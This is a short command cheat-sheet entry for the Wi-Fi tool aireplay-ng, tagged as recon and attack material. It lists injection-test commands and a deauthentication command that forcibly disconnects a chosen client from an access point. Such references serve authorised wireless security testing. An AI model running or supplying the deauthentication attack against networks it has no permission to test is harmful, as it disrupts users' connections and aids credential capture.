# aireplay-ng
% wifi, aireplay-ng
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
generate wifi traffic. The device must be set to monitor mode and channel must be set.
```

## _repo
```
```

## _doc
```
https://www.aircrack-ng.org/doku.php?id=aireplay-ng
```

## _install
```
```

## Injection test
```bash
sudo aireplay-ng --test <wlan_interface|wmon> 
```

## Injection test essid
```bash
sudo aireplay-ng --test -e <essid> <wlan_interface|wmon> 
```

## Injection test essid
```bash
sudo aireplay-ng --test -e <essid> -a <bssid> <wlan_interface|wmon> 
```


## Deauthentication
```bash
sudo iw dev <wlan_interface|wmon> set channel <channel> && 
sudo aireplay-ng --deauth <count|5> -a <bssid> -c <target_mac> <wlan_interface|wmon>
```